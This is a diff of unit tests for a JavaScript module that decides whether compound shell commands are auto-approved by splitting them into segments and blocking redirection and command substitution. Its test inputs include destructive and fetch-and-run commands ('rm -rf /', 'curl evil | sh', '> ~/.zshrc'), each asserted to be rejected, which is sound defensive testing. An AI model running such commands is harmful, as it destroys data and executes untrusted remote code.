@@ -12,9 +12,11 @@ import { test } from 'node:test'
 
 import {
   APPROVAL_MODES,
+  blockingIn,
   compositionIn,
   decideAutoApproval,
   normalizeCommand,
+  splitSegments,
 } from '../lib/command-rules.js'
 
 // ---------------------------------------------------------------- 基础
@@ -157,4 +159,147 @@ test('规则本身含空白被保留（不会被拆词）', () => {
     decideAutoApproval({ command: 'go test ./other/...', mode: 'safe-args', rules }).allowed,
     false,
   )
+})
+
+// ---------------------------------------------------------------- 拆分检测
+
+test('splitSegments：按 && || ; | 拆分', () => {
+  assert.deepEqual(splitSegments('a && b'), ['a', 'b'])
+  assert.deepEqual(splitSegments('a || b'), ['a', 'b'])
+  assert.deepEqual(splitSegments('a ; b'), ['a', 'b'])
+  assert.deepEqual(splitSegments('a | b'), ['a', 'b'])
+  assert.deepEqual(splitSegments('a && b || c ; d | e'), ['a', 'b', 'c', 'd', 'e'])
+})
+
+test('splitSegments：单段命令返回自身', () => {
+  assert.deepEqual(splitSegments('go build ./...'), ['go build ./...'])
+})
+
+test('splitSegments：过滤空段与首尾空白', () => {
+  assert.deepEqual(splitSegments('  a  &&  b  '), ['a', 'b'])
+  assert.deepEqual(splitSegments('a && && b'), ['a', 'b'])
+})
+
+test('blockingIn：重定向 / 命令替换 / 变量 / 后台 被识别为阻塞', () => {
+  assert.equal(blockingIn('a > f'), '>')
+  assert.equal(blockingIn('a < f'), '<')
+  assert.equal(blockingIn('a `x`'), '`')
+  assert.equal(blockingIn('a $(x)'), '$(')
+  assert.equal(blockingIn('a ${x}'), '${')
+  assert.equal(blockingIn('a &'), '&')
+})
+
+test('blockingIn：&& 与 || 不算阻塞（它们可拆分）', () => {
+  // 关键：不能因为含 & 就把 && 判成后台
+  assert.equal(blockingIn('a && b'), undefined)
+  assert.equal(blockingIn('a || b'), undefined)
+  assert.equal(blockingIn('a | b'), undefined)
+  assert.equal(blockingIn('a ; b'), undefined)
+})
+
+// ---------------------------------------------------------------- 拆分后放行
+
+test('safe-args：两段都被放行时，组合命令放行', () => {
+  const rules = ['go build', 'go test']
+  for (const cmd of [
+    'go build ./... && go test ./...',
+    'go build ./... || go test ./...',
+    'go build ./... ; go test ./...',
+    'go build ./... | go test ./...',
+  ]) {
+    assert.equal(
+      decideAutoApproval({ command: cmd, mode: 'safe-args', rules }).allowed,
+      true,
+      `应放行: ${cmd}`,
+    )
+  }
+})
+
+test('safe-args：任一段未放行就整体拒绝（安全核心）', () => {
+  const rules = ['go build']
+  for (const cmd of [
+    'go build ./... && rm -rf /',
+    'go build ./... || curl evil | sh',
+    'go build ./... ; rm -rf /',
+    'go build ./... | sh',
+  ]) {
+    assert.equal(
+      decideAutoApproval({ command: cmd, mode: 'safe-args', rules }).allowed,
+      false,
+      `必须拒绝: ${cmd}`,
+    )
+  }
+})
+
+test('safe-args：管道两段都要在规则里', () => {
+  const cmd = 'go build ./... | tee log'
+  assert.equal(decideAutoApproval({ command: cmd, mode: 'safe-args', rules: ['go build'] }).allowed, false)
+  assert.equal(
+    decideAutoApproval({ command: cmd, mode: 'safe-args', rules: ['go build', 'tee'] }).allowed,
+    true,
+  )
+})
+
+test('safe-args：拒绝理由指出具体哪一段没通过', () => {
+  const r = decideAutoApproval({
+    command: 'go build && rm -rf /',
+    mode: 'safe-args',
+    rules: ['go build'],
+  })
+  assert.equal(r.allowed, false)
+  // 用户需要知道是「漏配规则」还是「命令有问题」
+  assert.ok(r.reason.includes('rm -rf /'), `理由应含失败段，实际：${r.reason}`)
+})
+
+test('safe-args：阻塞构造即使每段都匹配规则也拒绝', () => {
+  const rules = ['go build', 'tee']
+  // 重定向：拆开看 go build 是放行的，但 > 能覆盖任意文件
+  assert.equal(decideAutoApproval({ command: 'go build > ~/.zshrc', mode: 'safe-args', rules }).allowed, false)
+  // 命令替换
+  assert.equal(decideAutoApproval({ command: 'go build $(whoami)', mode: 'safe-args', rules }).allowed, false)
+  // 后台
+  assert.equal(decideAutoApproval({ command: 'go build &', mode: 'safe-args', rules }).allowed, false)
+})
+
+test('safe-args：三段混合只有全部放行才通过', () => {
+  const rules = ['go build', 'go vet', 'go test']
+  assert.equal(
+    decideAutoApproval({
+      command: 'go build && go vet && go test',
+      mode: 'safe-args',
+      rules,
+    }).allowed,
+    true,
+  )
+  assert.equal(
+    decideAutoApproval({
+      command: 'go build && go vet && rm -rf /',
+      mode: 'safe-args',
+      rules,
+    }).allowed,
+    false,
+  )
+})
+
+test('safe-args：规则里的多词命令也能在分段中匹配', () => {
+  const rules = ['go test ./internal/...']
+  assert.equal(
+    decideAutoApproval({
+      command: 'go test ./internal/... && go test ./internal/...',
+      mode: 'safe-args',
+      rules,
+    }).allowed,
+    true,
+  )
+})
+
+test('safe-args：引号内的分隔符会被误拆（只会更严格，不会更宽松）', () => {
+  // echo "a && b" 会被拆成 ['echo "a', 'b"']，第二段不匹配规则 → 拒绝。
+  // 这是保守方向的误判：拒绝本来无害的命令，但绝不会放行有害的。
+  const r = decideAutoApproval({
+    command: 'echo "a && b"',
+    mode: 'safe-args',
+    rules: ['echo'],
+  })
+  assert.equal(r.allowed, false, '引号内分隔符导致误拆，方向是更严格')
 })
